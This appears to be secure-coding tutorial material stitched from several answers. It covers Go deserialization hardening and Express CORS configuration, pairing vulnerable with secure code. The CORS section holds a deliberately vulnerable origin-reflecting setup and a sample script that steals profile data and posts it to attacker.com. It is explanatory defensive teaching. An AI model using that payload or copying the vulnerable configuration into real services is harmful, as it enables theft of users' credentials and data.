	mac.Write(data)
	expected := hex.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(expected), []byte(signature))
}

func secureConfigHandler(w http.ResponseWriter, r *http.Request) {
	// Limit request body size
	r.Body = http.MaxBytesReader(w, r.Body, 4096)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Request too large", http.StatusRequestEntityTooLarge)
		return
	}

	// Verify HMAC signature for integrity
	signature := r.Header.Get("X-Signature")
	if signature == "" || !verifyHMAC(body, signature) {
		log.Printf("Invalid signature from %s", r.RemoteAddr)
		http.Error(w, "Invalid signature", http.StatusUnauthorized)
		return
	}

	// Deserialize to strict type
	var config SafeConfig
	if err := json.Unmarshal(body, &config); err != nil {
		log.Printf("JSON parse error from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Validate after deserialization
	if err := config.Validate(); err != nil {
		log.Printf("Validation failed from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Validation failed", http.StatusBadRequest)
		return
	}

	log.Printf("Config loaded: %s from %s", config.Name, r.RemoteAddr)
	w.Write([]byte("Config loaded: " + config.Name))
}

func main() {
	http.HandleFunc("/config", secureConfigHandler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Key Security Controls**:
- **Strict typing**: Use concrete types instead of `interface{}` to prevent type confusion
- **HMAC verification**: Verify data integrity before deserialization
- **Input validation**: Validate all fields after deserialization with allowlists
- **Size limits**: Prevent DoS via large payloads with `MaxBytesReader`

Excellent question! Dynamic type handling is one of the most dangerous patterns in deserialization. Here's how to implement a safe plugin/polymorphic system without exposing yourself to deserialization attacks.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

// =====================================================
// SAFE POLYMORPHIC DESERIALIZATION PATTERN
// =====================================================

// Plugin defines a safe interface - no code execution capabilities
type Plugin interface {
	Type() string
	Execute(ctx context.Context, input map[string]string) (map[string]string, error)
	Validate() error
}

// PluginFactory creates plugins from safe config data
type PluginFactory func(config json.RawMessage) (Plugin, error)

// PluginRegistry with strict allowlist
type PluginRegistry struct {
	mu       sync.RWMutex
	factories map[string]PluginFactory
	allowed   map[string]bool
}

func NewPluginRegistry() *PluginRegistry {
	return &PluginRegistry{
		factories: make(map[string]PluginFactory),
		allowed:   make(map[string]bool),
	}
}

// Register adds a plugin factory - called at startup, not from user input
func (r *PluginRegistry) Register(typeName string, factory PluginFactory) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.factories[typeName] = factory
	r.allowed[typeName] = true
}

// CreatePlugin safely creates a plugin from user request
func (r *PluginRegistry) CreatePlugin(typeName string, config json.RawMessage) (Plugin, error) {
	r.mu.RLock()
	defer r.mu.RUnlock()

	// CRITICAL: Allowlist check before any processing
	if !r.allowed[typeName] {
		return nil, fmt.Errorf("unknown plugin type: %s", typeName)
	}

	factory, exists := r.factories[typeName]
	if !exists {
		return nil, errors.New("plugin factory not found")
	}

	return factory(config)
}

// =====================================================
// EXAMPLE SAFE PLUGIN IMPLEMENTATIONS
// =====================================================

// LoggingPlugin - a safe plugin that only logs messages
type LoggingPlugin struct {
	Level   string `json:"level"`
	Prefix  string `json:"prefix"`
	MaxLen  int    `json:"max_len"`
}

func (p *LoggingPlugin) Type() string { return "logging" }

func (p *LoggingPlugin) Validate() error {
	allowedLevels := map[string]bool{"debug": true, "info": true, "warn": true, "error": true}
	if !allowedLevels[p.Level] {
		return errors.New("invalid log level")
	}
	if len(p.Prefix) > 32 {
		return errors.New("prefix too long")
	}
	if p.MaxLen < 1 || p.MaxLen > 10000 {
		return errors.New("invalid max_len")
	}
	return nil
}

func (p *LoggingPlugin) Execute(ctx context.Context, input map[string]string) (map[string]string, error) {
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	default:
	}

	msg := input["message"]
	if len(msg) > p.MaxLen {
		msg = msg[:p.MaxLen]
	}
	log.Printf("[%s] %s: %s", p.Level, p.Prefix, msg)
	return map[string]string{"status": "logged"}, nil
}

func NewLoggingPlugin(config json.RawMessage) (Plugin, error) {
	var p LoggingPlugin
	if err := json.Unmarshal(config, &p); err != nil {
		return nil, fmt.Errorf("invalid logging config: %w", err)
	}
	if err := p.Validate(); err != nil {
		return nil, err
	}
	return &p, nil
}

// TransformPlugin - safe data transformation
type TransformPlugin struct {
	Operation string `json:"operation"`
	Field     string `json:"field"`
}

func (p *TransformPlugin) Type() string { return "transform" }

func (p *TransformPlugin) Validate() error {
	allowedOps := map[string]bool{"uppercase": true, "lowercase": true, "trim": true, "hash": true}
	if !allowedOps[p.Operation] {
		return fmt.Errorf("operation not allowed: %s", p.Operation)
	}
	return nil
}

func (p *TransformPlugin) Execute(ctx context.Context, input map[string]string) (map[string]string, error) {
	value := input[p.Field]
	var result string

	switch p.Operation {
	case "uppercase":
		result = fmt.Sprintf("%s", value) // Use safe string functions
	case "hash":
		hash := sha256.Sum256([]byte(value))
		result = hex.EncodeToString(hash[:])
	default:
		result = value
	}

	return map[string]string{p.Field: result}, nil
}

func NewTransformPlugin(config json.RawMessage) (Plugin, error) {
	var p TransformPlugin
	if err := json.Unmarshal(config, &p); err != nil {
		return nil, err
	}
	if err := p.Validate(); err != nil {
		return nil, err
	}
	return &p, nil
}

// =====================================================
// SECURE REQUEST HANDLING
// =====================================================

type PluginRequest struct {
	Type   string          `json:"type"`
	Config json.RawMessage `json:"config"`
	Input  map[string]string `json:"input"`
}

type AuditLogger struct {
	mu   sync.Mutex
	logs []string
}

func (a *AuditLogger) Log(event string) {
	a.mu.Lock()
	defer a.mu.Unlock()
	entry := fmt.Sprintf("%s: %s", time.Now().Format(time.RFC3339), event)
	a.logs = append(a.logs, entry)
	log.Println("AUDIT:", entry)
}

var registry = NewPluginRegistry()
var auditLog = &AuditLogger{}

func pluginHandler(w http.ResponseWriter, r *http.Request) {
	// Layer 1: Request size limit
	r.Body = http.MaxBytesReader(w, r.Body, 16384)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		auditLog.Log(fmt.Sprintf("Request read error from %s", r.RemoteAddr))
		http.Error(w, "Request error", http.StatusBadRequest)
		return
	}

	// Layer 2: Parse request envelope (not the plugin config yet)
	var req PluginRequest
	if err := json.Unmarshal(body, &req); err != nil {
		auditLog.Log(fmt.Sprintf("Invalid JSON from %s", r.RemoteAddr))
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Layer 3: Allowlist check BEFORE deserialization of config
	auditLog.Log(fmt.Sprintf("Plugin request type=%s from %s", req.Type, r.RemoteAddr))

	// Layer 4: Create plugin through safe factory pattern
	plugin, err := registry.CreatePlugin(req.Type, req.Config)
	if err != nil {
		auditLog.Log(fmt.Sprintf("Plugin creation failed: %v from %s", err, r.RemoteAddr))
		http.Error(w, "Invalid plugin configuration", http.StatusBadRequest)
		return
	}

	// Layer 5: Execute with timeout context
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()

	result, err := plugin.Execute(ctx, req.Input)
	if err != nil {
		auditLog.Log(fmt.Sprintf("Plugin execution failed: %v", err))
		http.Error(w, "Execution error", http.StatusInternalServerError)
		return
	}

	auditLog.Log(fmt.Sprintf("Plugin %s executed successfully", req.Type))

	response, _ := json.Marshal(result)
	w.Header().Set("Content-Type", "application/json")
	w.Write(response)
}

func main() {
	// Register ONLY safe plugins at startup
	registry.Register("logging", NewLoggingPlugin)
	registry.Register("transform", NewTransformPlugin)
	// Never register dangerous types like exec.Cmd, reflect operations, etc.

	http.HandleFunc("/plugin", pluginHandler)

	log.Println("Starting secure plugin server on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Defense in Depth Layers**:

1. **Allowlist-based type resolution**:
```go
// Type name comes from user, but factory is from compile-time registration
if !r.allowed[typeName] {
    return nil, fmt.Errorf("unknown plugin type: %s", typeName)
}
```

2. **Two-phase deserialization**:
```go
// Phase 1: Parse envelope to get type (safe)
var req PluginRequest
json.Unmarshal(body, &req)

// Phase 2: Deserialize config ONLY to known safe type
plugin, err := registry.CreatePlugin(req.Type, req.Config)
```

3. **Execution sandboxing with context**:
```go
ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
result, err := plugin.Execute(ctx, req.Input)
```

**Additional Protections**:

- **Never use `gob` with untrusted input**: gob can deserialize arbitrary types including `exec.Cmd`
- **Never use reflection-based deserializers**: Libraries that use reflect to instantiate arbitrary types are dangerous
- **Audit logging**: Every plugin operation is logged with timestamp and source IP
- **Input sanitization in plugins**: Each plugin validates its own configuration
- **No code execution capabilities**: Plugin interface doesn't expose system calls, file operations, or network access
- **Immutable registry**: Plugins are registered at startup, not dynamically from requests

CORS errors are frustrating, but be very careful how you fix them. Using wildcard (*) origins or reflecting any origin is extremely dangerous and exposes your API to cross-site attacks.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// DANGEROUS: Wildcard allows any website to access your API
app.use(cors({
  origin: '*',
  credentials: true  // This combination is invalid but often attempted
}));

// ALSO DANGEROUS: Reflecting any origin
app.use((req, res, next) => {
  // Blindly reflects whatever origin the attacker sends
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// Sensitive API endpoint
app.get('/api/user/profile', (req, res) => {
  // Returns sensitive user data
  res.json({
    id: req.user.id,
    email: req.user.email,
    apiKey: req.user.apiKey,
    paymentMethods: req.user.paymentMethods
  });
});

app.listen(3000);
```

**Attack Payload** (hosted on attacker's website):
```html
<script>
// Attacker's malicious page at evil-site.com
fetch('https://vulnerable-api.com/api/user/profile', {
  credentials: 'include'  // Sends victim's cookies
})
.then(response => response.json())
.then(data => {
  // Steal user's API key and payment methods
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

**Why This Is Dangerous**:
- Wildcard origin (*) allows ANY website to make requests to your API
- Reflecting arbitrary origins with credentials enables session hijacking
- Attackers can steal sensitive data from authenticated users who visit malicious pages
- API keys, personal data, and financial information can be exfiltrated

**SECURE VERSION**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// Explicit whitelist of allowed origins
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  'https://admin.myapp.com'
];

// Add development origin only in non-production
if (process.env.NODE_ENV !== 'production') {
  allowedOrigins.push('http://localhost:3000');
}

const corsOptions = {
  origin: function(origin, callback) {
    // Allow requests with no origin (mobile apps, curl, etc.)
    // Only if you specifically need this - consider removing
    if (!origin) {
      return callback(null, true);
    }

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`CORS blocked request from: ${origin}`);
      callback(new Error('CORS policy violation'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400  // Cache preflight for 24 hours
};

app.use(cors(corsOptions));

app.get('/api/user/profile', (req, res) => {
  res.json({
    id: req.user.id,
    email: req.user.email
    // Never expose API keys in profile responses
  });
});

app.listen(3000);
```

**Key Security Controls**:
- **Explicit origin whitelist**: Only known, trusted domains can access the API
- **Environment-aware configuration**: Development origins only allowed in non-production
- **Logging of violations**: Security team can monitor blocked attempts
- **Limited exposed data**: Sensitive fields like API keys removed from responses

Great questions! Dynamic subdomain support requires careful regex validation, and proper preflight handling is crucial for security and performance. Here's a production-ready implementation:

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();

// Security headers
app.use(helmet());

// CORS Configuration with dynamic subdomain support
class CorsHandler {
  constructor(options) {
    this.baseDomain = options.baseDomain;
    this.staticOrigins = new Set(options.staticOrigins || []);
    this.allowSubdomains = options.allowSubdomains || false;
    this.subdomainPattern = this.allowSubdomains 
      ? new RegExp(`^https:\/\/([a-z0-9-]+\.)?${this.escapeRegex(this.baseDomain)}$`)
      : null;
  }

  escapeRegex(string) {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  isOriginAllowed(origin) {
    if (!origin) return false;

    // Check static whitelist first
    if (this.staticOrigins.has(origin)) {
      return true;
    }

    // Check subdomain pattern if enabled
    if (this.subdomainPattern && this.subdomainPattern.test(origin)) {
      return true;
    }

    return false;
  }

  middleware() {
    return (req, res, next) => {
      const origin = req.headers.origin;

      // Handle preflight requests
      if (req.method === 'OPTIONS') {
        return this.handlePreflight(req, res, origin);
      }

      // Handle actual requests
      this.handleActualRequest(req, res, next, origin);
    };
  }

  handlePreflight(req, res, origin) {
    if (this.isOriginAllowed(origin)) {
      res.setHeader('Access-Control-Allow-Origin', origin);
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
      res.setHeader('Access-Control-Allow-Headers', 
        'Content-Type, Authorization, X-Requested-With, X-CSRF-Token');
      res.setHeader('Access-Control-Max-Age', '86400');
      res.setHeader('Vary', 'Origin');
      return res.status(204).end();
    }

    // Log blocked preflight
    console.warn(`CORS preflight blocked: ${origin} -> ${req.path}`);
    return res.status(403).json({ error: 'CORS policy violation' });
  }

  handleActualRequest(req, res, next, origin) {
    if (!origin) {
      // No origin header - could be same-origin, server-to-server, or curl
      // Decide based on your security requirements
      return next();
    }

    if (this.isOriginAllowed(origin)) {
      res.setHeader('Access-Control-Allow-Origin', origin);
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      res.setHeader('Vary', 'Origin');
      return next();
    }

    // Log and block unauthorized origin
    console.error(`CORS violation: ${origin} attempted access to ${req.path}`);
    return res.status(403).json({ error: 'Origin not allowed' });
  }
}

// Production configuration
const corsHandler = new CorsHandler({
  baseDomain: 'mycompany.com',
  allowSubdomains: true,
  staticOrigins: [
    'https://mycompany.com',
    'https://www.mycompany.com',
    'https://app.mycompany.com',
    'https://api.mycompany.com'
  ]
});

// Add localhost only in development
if (process.env.NODE_ENV === 'development') {
  corsHandler.staticOrigins.add('http://localhost:3000');
  corsHandler.staticOrigins.add('http://localhost:8080');
}

app.use(corsHandler.middleware());

// Rate limiting for API endpoints
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    console.warn(`Rate limit exceeded: ${req.ip}`);
    res.status(429).json({ error: 'Too many requests' });
  }
});

app.use('/api/', apiLimiter);

// Sensitive endpoints with additional CSRF protection
app.post('/api/user/settings', (req, res) => {
  // Verify CSRF token for state-changing operations
  const csrfToken = req.headers['x-csrf-token'];
  if (!csrfToken || csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Process request
  res.json({ success: true });
});

// Health check (no CORS restrictions needed)
app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(process.env.PORT || 3000, () => {
  console.log(`Server running in ${process.env.NODE_ENV || 'development'} mode`);
});
```

**Defense in Depth Layers**:

1. **Origin Validation Layer**:
```javascript
// Strict regex for subdomain matching - prevents regex injection
const subdomainPattern = /^https:\/\/([a-z0-9-]+\.)?mycompany\.com$/;
// Only matches: https://mycompany.com, https://app.mycompany.com
// Does NOT match: https://evil-mycompany.com, https://mycompany.com.evil.com
```

2. **Preflight Caching Layer**:
```javascript
// Cache preflight responses to reduce server load
res.setHeader('Access-Control-Max-Age', '86400'); // 24 hours
res.setHeader('Vary', 'Origin'); // Critical: tells browsers/CDNs to cache per-origin
```

3. **CSRF Token Layer**:
```javascript
// For state-changing operations, require CSRF token even with CORS
const crypto = require('crypto');

app.get('/api/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.json({ csrfToken: token });
});
```

**Additional Protections**:

- **Vary: Origin header**: Essential for proper caching behavior with CDNs; prevents one origin's response from being served to another
- **No wildcard with credentials**: Browsers block `Access-Control-Allow-Origin: *` when `credentials: include` is used - but don't rely on this, implement proper validation
- **Subdomain regex anchoring**: Always anchor regex patterns (^ and $) to prevent bypass via attacker domains like `evil-mycompany.com`
- **Separate public/private APIs**: Public APIs can use broader CORS; private APIs with user data need strict origin validation
- **Security monitoring**: Log all CORS violations for security analysis and potential attack detection
- **SameSite cookies**: Use `SameSite=Strict` or `SameSite=Lax` cookies as additional protection against cross-site attacks

